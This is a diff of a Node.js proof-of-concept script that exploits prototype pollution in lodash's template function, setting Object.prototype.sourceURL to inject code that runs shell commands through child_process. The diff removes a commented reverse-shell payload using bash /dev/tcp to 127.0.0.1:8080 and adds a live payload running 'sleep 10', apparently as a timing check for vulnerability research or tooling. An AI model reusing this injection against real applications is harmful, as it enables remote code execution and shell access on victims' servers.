@@ -4,18 +4,20 @@ const fs = require('fs')
 /**
  * Polluted Payload
  */
-// Object.prototype.sourceURL = "\u000areturn e => {return process.mainModule.require(`child_process`).execSync(`bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1'`)}\u000a//"
+Object.prototype.sourceURL = "\u000areturn e => {return process.mainModule.require(`child_process`).execSync(`bash -c 'sleep 10'`)}\u000a//"
 
-// for node-find-undefined
-console.log("===========start===========")
+console.log("=".repeat(20) + "start" + "=".repeat(20) + "\n");
 
 /**
  * Exported function call
  */
-fs.readFile('./template.ejs', (err, content) => {
+fs.readFile(__dirname+'/template.ejs', (err, content) => {
     let compiled = lodash.template(content)
-    let rendered = compiled({...options})
+    let rendered = compiled({
+        language: 'a', 
+        category: 'b'
+    })
 })
 
 // for node-find-undefined
-console.log("===========end===========")
+console.log("=".repeat(20) + "end" + "=".repeat(20) + "\n");
